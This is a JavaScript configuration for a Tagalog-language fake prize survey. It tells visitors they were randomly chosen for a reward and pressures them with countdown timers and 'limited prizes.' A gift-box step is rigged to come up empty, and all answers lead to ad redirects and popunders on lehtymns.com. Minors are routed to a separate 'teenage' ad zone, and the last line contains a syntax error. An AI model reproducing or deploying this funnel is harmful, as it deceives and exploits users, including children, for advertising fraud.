window.surveyData={adex:1,adex_alert_urll:'https://lehtymns.com/4453095/?var={zone}&ymid={request_var}',adex_warning_urll:'https://lehtymns.com/4453095/?var={zone}&ymid={request_var}',ipp_zonex:4599387,ipp_zone_teenagex:4599749,ipp_zone_reverse:4453914,comment:'Sweep New 6 PH Proofreading',autoexitx:4254940,push_zonex:4843177,reverse_zonex:4254937,popunder_urll:'https://lehtymns.com/4254936/?var={zone}&ymid={request_var}',lead:{not_unique:{redirect_urll:'https://lehtymns.com/4254934/?var={zone}&ymid={request_var}',},},title:'Minamahal na user',subtitle:['Nag-aalok kami sa iyo ng pagkakataong makatanggap ng gantimpala mula sa aming mga sponsor!','Para matanggap ang iyong gantimpala, kumpletuhin lang ang aming maikli at hindi nakikilalang survey.','Mayroon ka lamang <b>{min} minuto at {sec} segundo</b>, upang lumahok.',],logo_text:'Binabati kita! <br> <br> Paligsahang Pang-promosyon sa <b>{date:today}</b>',alert:{welcome:`<h1>Binabati kita!</h1>
                <p>
                    Ngayon <b>{date:today}</b> ikaw ay random na napili upang lumahok sa pagsusulit na ito.
                    Kakailanganin ka lamang ng isang minuto at magkakaroon ka ng pagkakataong makatanggap ng isang premyo.
                </p>
                <img src='/img/sweep/tokens10k.png'>
                <p>
                    Bawat linggo namin random kaming pipili ng 10 user.
                    Tanging 10 masuwerteng gumagamit na nakatira sa <b>{countryName}</b> ang may pagkakataon na makatanggap ng gantimpala!
                </p>
                <p>
                    Mayroon ka lamang <span><b>{min} Minuto at {sec} segundo</b></span>, upang lumahok.
                    <br>
                    Magmadali ka!
                    Mayroong limitadong bilang ng mga premyo!
                </p>`,welcomebtn:'Magpatuloy',empty:'Paumanhin, walang laman ang kahon ng regalo na ito! Mayroon ka pa ring ilang mga pagsubok na natitira. Suwerte!',final:'',},main:{type:'question',text:'Ano ang iyong kasarian?',options:[{type:'button',text:'Lalaki',audience_id:[61427,60623],action:{goto:'step2',},},{type:'button',text:'Babae',audience_id:[61428,60624],action:{goto:'step2',},},],},step2:{type:'question',text:'Ilang taon ka?',options:[{type:'button',text:'wala pang 18 taong gulang',audience_id:[61421,62387,60625],action:{redirect_ipp:'teenage',redirect_url: SmartURL,popunder_url: SmartURL,},},{type:'button',text:'18-29 taon',audience_id:[62180,62377,68427,78100,62377,62382,68423,78096],action:{goto:'step3',},},{type:'button',text:'30-49 taon',audience_id:[62181,62380,68425,78097,62383,78101],action:{goto:'step3',},},{type:'button',text:'50-80 taon',audience_id:[62182,62381,68426,78098,62384,78102],action:{goto:'step3',},},],},step3:{type:'question',text:'Gaano ka kadalas mamili online?',options:[{type:'button',text:'Araw-araw',audience_id:0,action:{goto:'step4',},},{type:'button',text:'Madalas',audience_id:0,action:{goto:'step4',},},{type:'button',text:'Bihirang',audience_id:0,action:{goto:'step4',},},{type:'button',text:'Huwag kailanman',audience_id:0,action:{goto:'step4',},},],},step4:{type:'question',text:'Ginamit mo na ba ang mga gift card/voucher para sa iyong mga pagbili?',options:[{type:'button',text:'Oo',audience_id:0,action:{goto:'step5',},},{type:'button',text:'Walang',audience_id:0,action:{goto:'step5',},},],},step5:{type:'question',text:'Interesado ka ba sa pagkuha ng pinakamalaking diskwento at regalo?',options:[{type:'button',text:'Oo',audience_id:0,action:{goto:'step6',},},{type:'button',text:'Walang',audience_id:0,action:{goto:'step6',},},],},step6:{type:'question',text:'Ano ang gusto mong mas gusto?',options:[{type:'button',text:'Gift Card',audience_id:0,action:{goto:'final',},},{type:'button',text:'Isang beses na diskwento',audience_id:0,action:{goto:'final',},},{type:'button',text:'Diskwento card',audience_id:0,action:{goto:'final',},},],},final:{type:'thank_you',boxes:1,timeout:40,timeout_url: SmartURL,timeout_conversion:1,content:`<div class="final">
                        <div class="final__step1">
                            <p>Salamat sa pagkuha ng aming pagsusulit.</p>
                            <p>Ngayon ay mayroon kang pagkakataon na makatanggap ng gantimpala.</p>
                            <p>Ang kailangan mo lang gawin ay piliin ang tamang kahon ng regalo.</p>
                        </div>
                        <div class="final__step2">
                            <p>Oops!</p>
                            <p>Ang mga kahon ay walang laman.</p>
                            <p>Mayroon ka pa ring pagkakataon na makatanggap ng gantimpala mula sa aming mga kasosyo.</p>
                            <p>Available lamang ang alok na ito para sa susunod na 7 minuto!</p>
                        </div>
                        <div class="instructions">
                            <h2 class="instructions__header">Maghanap ng gantimpala!</h2>
                            <div class="instructions__text">
                            <span class=bounce>↓</span>
                            <h3 class="instructions__text-1">Ang kailangan mo lang gawin ay piliin <b>ang tamang kahon ng regalo</b>.</h3>
                            <h3 class="instructions__text-2">I-click ang pindutang MAGPATULOY at kumpletuhin ang mga huling hakbang upang makakuha ng pagkakataong makatanggap ng gantimpala!</h3>
                            <span class=bounce>↓</span>
                        </div>
                    </div>
                </div>`,progress_title:'Tinatantya ang mga resulta...',progress_texts:['Maghintay... Sinusuri ang mga sagot','Maghintay... Bilangin ang iyong iskor',],progress_content:'',options:[{type:'button',text:'MAGPATULOY',audience_id:61426,action:{conversion:1,redirect_url: SmartURL',},},],},};